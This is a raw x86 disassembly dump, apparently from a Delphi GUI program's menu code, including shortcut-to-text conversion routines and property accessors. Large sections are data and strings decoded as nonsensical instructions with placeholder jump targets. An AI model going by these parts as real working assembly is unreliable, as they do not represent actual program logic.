add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop ds
inc ebp
add [ eax + eax ] dl
add [ eax ] al
in al dx
add ah al
mov dl 0x42
add [ eax + 0xe0042b2 ] dh
push esp
dec ebp
outsb
jne r-xdata
xor [ edx - 0x4d1bffbe ] 0x42
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff80455fbe
mov dl 0x42
add ah ah
mov dl 0x42
imul esi [ ebx + 0x74 ] 0x451f9090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x80045 ] bl
add [ eax ] al
inc eax
mov cl 0x42
nop
pop ds
inc ebp
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffec455f52
mov [ 0xffffffffa4900041 ] al
inc ecx
add al dl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x5d ] al
inc ecx
add [ ebx + 0x6be40041 ] bh
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_446c8c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_451aed
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
je r-xdata
outsb
je r-xdata
mov al 0x1b
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
sbb eax [ ebp ]
push es
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4465646f
adc [ ebp ] eax
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
xor al 0x1b
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
sbb eax [ ebp ]
lea eax [ eax ]
sbb [ eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x1c
inc ebp
outsd
je r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
mov ah 0x1b
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
or dl [ eax + edx * 2 + 0x6f ]
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
inc ecx
add [ eax ] cl
inc ebp
add [ ebp + 0xb740045 ] ah
inc edx
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
or eax 0x6f42616d
insd
inc ebp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add ah ah
imul eax [ ebp ] sub_4569f4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebp
add [ ebx * 2 + 0x65200045 ] dh
inc ebp
add [ edx + esi * 2 ] dl
inc ebp
add ah cl
jb r-xdata
inc edx
add [ eax + 0x6c00420e ] bh
jno r-xdata
add al ch
xor [ eax ] eax
loopne r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
sbb al 0x45
add [ eax ] bh
add [ eax ] al
pop esp
sbb [ ebp ] al
outsd
inc edx
outsd
je r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add ah al
imul eax [ ebp ] sub_4569d4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
jo r-xdata
add [ edx ] cl
push esp
push eax
outsd
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al dh
jae r-xdata
inc ebp
jae r-xdata
add eax 0x756e654d
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
outsd
insd
outsd
sbb al 0x1c
inc ebp
je r-xdata
jne r-xdata
jo r-xdata
je r-xdata
outsb
jne r-xdata
outsd
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
cwde
aam 0x1c
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
cmp [ ebx ] dl
inc ebp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb eax [ ebp ]
pushad
add [ eax ] al
jmp [ eax ]
outsb
sbb eax [ ebp ]
add ecx [ edi ]
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffe0455cae
jno r-xdata
xor al 0x40
add al bl
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax - 0x72ffbae5 ] esi
inc eax
add [ eax + 0x451c ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sbb al 0x45
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x1b ] dh
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
sub al 0x64
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jae r-xdata
add [ eax ] ch
jb r-xdata
jns r-xdata
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
jmp [ eax + 0x69 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
jns r-xdata
cld
jns r-xdata
inc ecx
add [ 0x756e654d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x45
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
add [ eax ] al
[ ecx ]
add [ eax ] dh
jb r-xdata
cld
cmp [ ebx ] dl
inc ebp
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
pop ds
inc ebp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x4f ] al
inc edx
jo r-xdata
inc ebx
push 0x65676e61
push 0x7000417a
add [ eax ] al
push [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
sbb eax [ ebp ]
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add ah ch
outsb
outsb
inc esp
adc [ ebp ] eax
push eax
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
dec edi
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
add [ eax ] dh
add [ eax ] al
dec [ ecx + ebp * 2 + 0x45 ]
add [ edx + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
or al [ eax ]
or eax 0x756e654d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
sbb al 0x45
add [ eax ] dl
sbb [ ebp ] eax
adc [ eax ] al
add eax 0x756e654d
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
jg r-xdata
shl [ edi + ebx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop ds
inc ebp
add [ eax + eax ] dl
add [ eax ] al
in al dx
add ah al
mov dl 0x42
add [ eax + 0xe0042b2 ] dh
push esp
dec ebp
outsb
jne r-xdata
xor [ edx - 0x4d1bffbe ] 0x42
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff80455fbe
mov dl 0x42
add ah ah
mov dl 0x42
imul esi [ ebx + 0x74 ] 0x451f9090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x80045 ] bl
add [ eax ] al
inc eax
mov cl 0x42
nop
pop ds
inc ebp
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffec455f52
mov [ 0xffffffffa4900041 ] al
inc ecx
add al dl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x5d ] al
inc ecx
add [ ebx + 0x6be40041 ] bh
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_446c8c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_451fdc
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_441430
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_446c8c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_452034
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45206c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404008
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404278
sub_4520c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_4522a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4041f0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040a0
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4041f0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4041f0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404008
mov eax esi
call sub_404008
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040a0
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408344
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404314
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45206c
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042d0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4522b0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
sub_4522c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042c8
push eax
mov eax edi
call sub_4042c8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042c8
push eax
mov eax edi
call sub_4044c8
push eax
mov eax [ esi ]
call sub_4044c8
pop edx
pop ecx
call sub_408224
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042c8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404568
sub_452320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_4523fb
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4522c4
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4522c4
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4522c4
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4522c4
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452402
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4520c0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4081d4
test eax eax
jne r-xdata
sub_452438
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4549d8
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4549e8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_452498
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4549d8
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4549d8
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4549e8
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4549e8
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_452438
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_452438
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4549e8
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4549e8
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_4525e4
push ebx
mov ebx eax
mov eax ebx
call sub_44f18c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45759c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45261c
push ebx
mov ebx eax
mov eax ebx
call sub_44f1a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45264c
push ebx
mov ebx eax
mov eax ebx
call sub_44f1b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45267c
push ebx
mov ebx eax
mov eax ebx
call sub_44f1dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4526ac
push ebx
mov ebx eax
mov eax ebx
call sub_44f204
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404414
je r-xdata
mov al 0x1
pop ebx
retn
sub_4526e0
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44f1c8
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45271c
push ebx
mov ebx eax
mov eax ebx
call sub_44f218
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452750
push ebx
mov ebx eax
mov eax ebx
call sub_44f22c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452784
push ebx
mov ebx eax
mov eax ebx
call sub_44f240
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4527b8
push ebx
mov ebx eax
mov eax ebx
call sub_421018
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4527e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_452800
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_454840
sub_452820
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4548b0
sub_452840
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_454904
sub_452860
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45287c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40405c
sub_4528a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_454a30
sub_4528c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_454a0c
sub_4528e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_454a20
sub_452900
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45292c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_452418
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45533c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4529a8
push ebx
push esi
call sub_4035c0
